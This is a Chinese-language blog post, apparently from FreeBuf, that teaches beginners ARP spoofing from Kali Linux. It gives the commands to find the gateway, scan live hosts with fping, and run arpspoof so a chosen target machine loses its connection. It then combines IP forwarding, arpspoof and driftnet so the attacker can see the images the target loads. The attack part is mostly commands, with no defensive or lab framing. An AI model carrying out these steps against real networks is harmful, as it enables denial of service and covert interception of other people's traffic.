首先向大家做一个自我介绍，我是FInternet一个不知名团队的团长，这是我入驻FreeBuf的第5天。这篇文章是我发布的第一篇文章，如果说文章中间存在标点符号或者文字的错误，可以在评论区指正，我也会及时回复的！

话不多说，我们开干！

首先打开kali的终端(废话)

我们要对该目标发动攻击肯定需要了解的以下信息：局域网的网关，本机ipv4的地址，目标机的ipv4地址。

先说说怎么知道局域网关：![](https://image.3001.net/images/20210804/1628084601_610a99798d44e16f2445a.png!small)如上图，输入route
-n即可，我们看到gateway那一竖拍中192.168.1.1就是我们要找的网关了。

接下来我们需要对局域网下的所有存活主机进行扫描，我这里使用fping进行扫描，你们也可以通过其他工具来发现存活主机。比如你nmap啊或者arping啊等等去扫描。当然arping只能一个一个的扫描，非常麻烦，我呢也给大家弄了一个arping的脚本，大家可以参考图片。![](https://image.3001.net/images/20210804/1628085225_610a9be9b3eb3a37e22dc.png!small)如果你不知道上述脚本怎么使用，欢迎在评论区提问，当然我本人建议你用一下方法去发现存活主机。

fping -g -a 192.168.1.0/24 > fping.txt 这句命令的作用是扫描192.168.1.1-254
并将存活主机ip记录到本目录下的fping.txt文件中，看下列实际操作图：![](https://image.3001.net/images/20210804/1628085670_610a9da640961f1a2f972.png!small)ok，接下来扫描完成后cat查看一下我们的fping.txt记录了哪些存活主机。  
![](https://image.3001.net/images/20210804/1628085931_610a9eab9db5195aeb146.png!small)那么在这里我们扫描到了4个ip其中192.168.1.1是我们的网关，192.168.1.240是我kali
linux的ip。

我们选中192.168.1.81作为目标机发起arp攻击，你可以直接使用以下命令使目标机网络无法正常使用：arpspoof -i
你的网卡昵称(interface) 目标机ip
网关如下图：![](https://image.3001.net/images/20210804/1628086473_610aa0c95727500760623.png!small)

这样就ok了，还有一种方法，可以使目标正常上网，并且可以浏览到他加载了哪些图片：流量转发+arpspoof+driftnet

如下图：1.echo 1 > /proc/sys/net/ipv4/ip_forward

2.arpspoof -i eth0(如果你的不是eth0请写你自己的网卡昵称) 192.168.1.81 192.168.1.1

3.打开另一个终端输入driftent -i eth0

实际操作如下图：![](https://image.3001.net/images/20210804/1628087011_610aa2e3d5a92212fc548.png!small)

如果文章对你有用，请你点赞转发加收藏！感谢读者大大！

